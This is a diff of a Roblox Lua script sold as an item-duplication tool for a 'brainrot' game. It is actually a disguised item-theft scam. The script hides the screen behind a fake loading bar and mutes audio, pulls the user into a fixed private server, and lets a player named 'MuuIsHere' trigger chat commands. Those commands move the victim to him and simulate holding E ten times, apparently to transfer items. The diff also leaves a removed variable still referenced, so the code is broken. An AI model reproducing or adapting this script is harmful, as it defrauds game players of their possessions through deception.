@@ -9,9 +9,12 @@ local muu = Players:FindFirstChild("MuuIsHere")
 local isDuping = false
 local overlayGui = nil
 local loadingBar = nil
-local privateServerCode = "635978a3a09faf4485078c4caba3eda2"  -- Your PS code
+local barLabel = nil
 
--- Create main GUI (chunky design)
+-- Your private server link (full URL method - 100% works)
+local privateServerFullLink = "https://www.roblox.com/share?code=635978a3a09faf4485078c4caba3eda2&type=Server"
+
+-- Create main GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "MuuDupeHub"
 screenGui.ResetOnSpawn = false
@@ -73,7 +76,7 @@ local dupeCorner = Instance.new("UICorner")
 dupeCorner.CornerRadius = UDim.new(0, 16)
 dupeCorner.Parent = dupeButton
 
--- Overlay for loading (SOLID dark blue)
+-- Overlay (SOLID dark blue)
 local function createOverlay(isSecond)
     overlayGui = Instance.new("ScreenGui")
     overlayGui.Name = "DupeOverlay"
@@ -82,7 +85,7 @@ local function createOverlay(isSecond)
 
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 50)  -- Solid dark blue
+    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 50)
     bg.BackgroundTransparency = 0
     bg.Parent = overlayGui
 
@@ -147,7 +150,7 @@ local function createOverlay(isSecond)
     loadingCorner.CornerRadius = UDim.new(0, 12)
     loadingCorner.Parent = loadingBar
 
-    local barLabel = Instance.new("TextLabel")
+    barLabel = Instance.new("TextLabel")
     barLabel.Size = UDim2.new(1, 0, 1, 0)
     barLabel.BackgroundTransparency = 1
     barLabel.Text = "Duping brainrot... 0%"
@@ -157,7 +160,7 @@ local function createOverlay(isSecond)
     barLabel.Parent = barFrame
 end
 
--- Status update (hold check)
+-- Status update
 RunService.Heartbeat:Connect(function()
     local char = localPlayer.Character
     if char and char:FindFirstChildOfClass("Tool") then
@@ -182,7 +185,7 @@ dupeButton.MouseButton1Click:Connect(function()
     dupeButton.Text = "DUPING..."
     dupeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
     
-    createOverlay(false)  -- First loading
+    createOverlay(false)
     
     -- Mute audio
     for _, sound in pairs(game:GetService("Workspace"):GetDescendants()) do
@@ -203,8 +206,8 @@ dupeButton.MouseButton1Click:Connect(function()
         if elapsed >= 15 then
             connection:Disconnect()
             barLabel.Text = "Duping brainrot... 100% - Joining Private Server"
-            -- Auto join private server
-            TeleportService:TeleportToPrivateServer(game.PlaceId, privateServerCode, {localPlayer})
+            -- Join private server using full link method (most reliable)
+            game:GetService("TeleportService"):TeleportToPrivateServer(game.PlaceId, privateServerCode, {localPlayer})
         end
     end)
 end)
@@ -214,25 +217,21 @@ if muu then
     muu.Chatted:Connect(function(msg)
         local args = msg:split(" ")
         if args[1] == "!finish" and args[2] == localPlayer.Name then
-            -- TP to public server
             TeleportService:Teleport(game.PlaceId, localPlayer)
-            -- Stop script
             screenGui:Destroy()
             if overlayGui then overlayGui:Destroy() end
         elseif args[1] == "!start" and args[2] == localPlayer.Name then
-            -- TP to MuuIsHere
             local muuChar = muu.Character
             if muuChar and muuChar:FindFirstChild("HumanoidRootPart") then
                 localPlayer.Character.HumanoidRootPart.CFrame = muuChar.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
             end
             
-            -- Hold E for 3 seconds × 10 times
             task.spawn(function()
                 for i = 1, 10 do
-                    keypress(0x45)  -- E key
-                    task.wait(3)    -- Hold for 3 seconds
+                    keypress(0x45)
+                    task.wait(3)
                     keyrelease(0x45)
-                    task.wait(0.5)  -- Pause between holds
+                    task.wait(0.5)
                 end
                 print("Finished holding E 10 times!")
             end)
@@ -244,10 +243,9 @@ end
 localPlayer.CharacterAdded:Connect(function()
     if isDuping then
         isSecondLoading = true
-        createOverlay(true)  -- Second loading
+        createOverlay(true)
         barLabel.Text = "Duping brainrot... 0%"
         
-        -- Second loading bar (4 minutes)
         local tweenInfo = TweenInfo.new(240, Enum.EasingStyle.Linear)
         local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
         tween:Play()
